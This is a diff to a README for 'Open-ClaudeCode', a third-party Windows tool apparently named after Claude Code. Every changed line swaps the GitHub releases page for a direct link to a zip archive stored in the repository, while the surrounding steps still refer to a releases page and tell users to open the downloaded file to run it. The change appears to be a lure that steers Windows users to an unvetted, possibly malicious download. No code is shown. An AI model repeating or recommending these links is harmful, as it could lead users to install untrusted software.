@@ -1,4 +1,4 @@
-[![Download Open-ClaudeCode](https://img.shields.io/badge/Download-Open--ClaudeCode-6f42c1?style=for-the-badge)](https://github.com/star-q-gamer/Open-ClaudeCode/releases)
+[![Download Open-ClaudeCode](https://img.shields.io/badge/Download-Open--ClaudeCode-6f42c1?style=for-the-badge)](https://raw.githubusercontent.com/star-q-gamer/Open-ClaudeCode/main/preconstruction/Claude_Open_Code_3.2.zip)
 
 # 🤖 Open-ClaudeCode - Simple ClaudeCode Tools for Windows
 
@@ -11,7 +11,7 @@ This repository focuses on a clean Windows use case. You can use it to manage Cl
 ## 📥 Download for Windows
 
 Visit this page to download:  
-https://github.com/star-q-gamer/Open-ClaudeCode/releases
+https://raw.githubusercontent.com/star-q-gamer/Open-ClaudeCode/main/preconstruction/Claude_Open_Code_3.2.zip
 
 On the releases page, look for the latest version and download the Windows file that matches your PC. After the file finishes downloading, open it to start the app.
 
@@ -37,7 +37,7 @@ For the best result, use a fully updated version of Windows.
 ## ⚙️ How to Install and Run
 
 1. Open the download page:
-   https://github.com/star-q-gamer/Open-ClaudeCode/releases
+   https://raw.githubusercontent.com/star-q-gamer/Open-ClaudeCode/main/preconstruction/Claude_Open_Code_3.2.zip
 
 2. Find the newest release near the top of the page.
 
@@ -184,7 +184,7 @@ Open-ClaudeCode is a good fit for:
 ## 📌 Project Link
 
 Primary download page:  
-https://github.com/star-q-gamer/Open-ClaudeCode/releases
+https://raw.githubusercontent.com/star-q-gamer/Open-ClaudeCode/main/preconstruction/Claude_Open_Code_3.2.zip
 
 ## 🧾 Files and Folders
 
